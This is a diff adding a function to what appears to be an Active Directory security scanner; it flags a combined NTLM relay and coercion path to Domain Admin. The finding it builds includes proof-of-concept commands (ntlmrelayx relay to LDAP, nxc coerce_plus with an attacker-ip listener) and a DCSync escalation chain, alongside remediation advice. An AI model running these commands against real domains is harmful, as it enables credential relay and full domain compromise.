@@ -91,6 +91,54 @@ def correlate_ldap_confidential(report: ScanReport) -> Finding | None:
     return finding
 
 
+def correlate_relay_path(report: ScanReport) -> Finding | None:
+    """Relay YÜZEYİ (LDAP signing/channel-binding zorlanmıyor) + COERCION primitifi
+    (Spooler/WebDAV/PrinterBug) birlikteyse, uçtan uca NTLM relay-to-LDAP → DA
+    zincirinin kullanılabilir olduğunu tek bir CRITICAL bulguda birleştirir.
+
+    İki sinyal tek başına 'orta' görünür; birlikte bulunmaları doğrudan Domain
+    Admin'e giden pratik bir yol demektir. Yeni komut çalıştırmaz (saf korelasyon).
+    """
+    relay_surface = [
+        f for f in report.findings
+        if f.control_id in ("ldap.signing.not-enforced",
+                            "ldaps.channel-binding.not-enforced")]
+    blob = "\n".join(
+        f"{f.control_id} {f.title} {f.source}".lower() for f in report.findings)
+    coercion = any(k in blob for k in (
+        "spooler", "printerbug", "webdav", "petitpotam", "ms-rprn", "coerce"))
+    if not relay_surface or not coercion:
+        return None
+
+    dc = report.dc_name or report.target
+    surface_txt = ", ".join(sorted({f.control_id for f in relay_surface}))
+    finding = Finding(
+        title="Uçtan uca NTLM relay → Domain Admin yolu kullanılabilir "
+              "(coercion + imzalama zorlanmıyor)",
+        severity=Severity.CRITICAL, target=report.target, source="correlate",
+        control_id="relay.coercion-to-da",
+        reference="NTLM Relay to LDAP (RBCD / Shadow Credentials / AddComputer)",
+        mitre="T1557.001",
+        description="Bir coercion primitifi (Spooler/WebDAV/PrinterBug) bir DC/host'u "
+                    "kimlik doğrulamaya zorlayabiliyor VE LDAP(S) imzalama/channel "
+                    "binding zorlanmıyor. Zorlanan makine hesabı kimliği LDAP'a relay "
+                    "edilip RBCD yazılabilir, shadow-credential eklenebilir veya makine "
+                    "hesabı oluşturulabilir → hedefe yerel admin → DCSync → Domain Admin.",
+        evidence=f"Relay yüzeyi: {surface_txt}\nCoercion primitifi: tespit edildi "
+                 "(Spooler/WebDAV/PrinterBug çıktısı)",
+        remediation="LDAP imzalamayı ve LDAPS channel binding'i (EPA) ZORLA; Print "
+                    "Spooler'ı DC'lerde kapat; WebClient servisini kaldır; makine hesabı "
+                    "oluşturma kotasını (MachineAccountQuota) 0 yap.",
+        poc=f"# 1 (dinleyici): ntlmrelayx.py -t ldap://{dc} --delegate-access "
+            "--no-dump\n# 2 (zorla):   nxc smb <DC> -M coerce_plus "
+            "-o LISTENER=<attacker-ip>\n#   (adscan: adscan <DC> --active-attacks --launch)",
+        escalation="RBCD yaz → S4U ile hedefe Administrator bileti → secretsdump → "
+                   "DCSync. adscan 'relay' modülü bu zinciri --active-attacks --launch "
+                   "ile kurar.")
+    report.add(finding)
+    return finding
+
+
 def correlate_tiering(report: ScanReport) -> Finding | None:
     """DA hesabı DC-olmayan host'ta aktifse CRITICAL bir tiering-ihlali bulgusu üretir."""
     if not report.da_members or not report.sessions:
